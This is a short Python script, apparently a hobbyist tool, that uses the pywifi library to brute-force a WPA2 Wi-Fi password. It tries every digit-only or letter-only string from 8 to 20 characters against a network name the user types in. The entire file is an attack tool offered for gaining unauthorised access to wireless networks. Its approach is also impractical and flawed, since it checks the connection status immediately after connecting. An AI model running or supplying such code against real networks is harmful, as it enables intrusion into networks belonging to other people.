import itertools

import pywifi

from pywifi import const

def wifi_connect(wifi_name, password):

    wifi = pywifi.PyWiFi()

    ifaces = wifi.interfaces()[0]

    profile = pywifi.Profile()

    profile.ssid = wifi_name

    profile.auth = const.AUTH_ALG_OPEN

    profile.akm.append(const.AKM_TYPE_WPA2PSK)

    profile.cipher = const.CIPHER_TYPE_CCMP

    profile.key = password

    ifaces.remove_all_network_profiles()

    tmp_profile = ifaces.add_network_profile(profile)

    ifaces.connect(tmp_profile)

    if ifaces.status() == const.IFACE_CONNECTED:

        return True

    else:

        return False

def brute_force_numbers(wifi_name):

    print("Starting WiFi password bruteforce with NUMBERS ONLY 8 - 20 Chars")

    chars = "0123456789"

    for length in range(8, 21):

        to_attempt = itertools.product(chars, repeat=length)

        for attempt in to_attempt:

            password = "".join(attempt)

            if wifi_connect(wifi_name, password):

                print("\033[32mPassword found: {}\033[0m".format(password))

                return True

            else:

                print("Trying: {}".format(password))

def brute_force_letters(wifi_name):

    print("Starting WiFi password bruteforce with letters only (big and small)")

    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

    for length in range(8, 21):

        to_attempt = itertools.product(chars, repeat=length)

        for attempt in to_attempt:

            password = "".join(attempt)

            if wifi_connect(wifi_name, password):

                print("\033[32mPassword found: {}\033[0m".format(password))

                return True

            else:

                print("Trying: {}".format(password))

if __name__ == "__main__":

    print("Welcome to WiFi Brute Force Script!")

    wifi_name = input("Type WiFi Name for bruteforce: ")

    print("Select an option:")

    print("1. Start WiFi password bruteforce with NUMBERS ONLY 8 - 20 Chars.")

    print("2. Start WiFi password bruteforce with letters only (big and small).")

    choice = input("My choice is: ")

    if choice == "1":

        brute_force_numbers(wifi_name)

    elif choice == "2":

        brute_force_letters(wifi_name)

    else:

        print("Invalid choice. Exiting...")


    



    
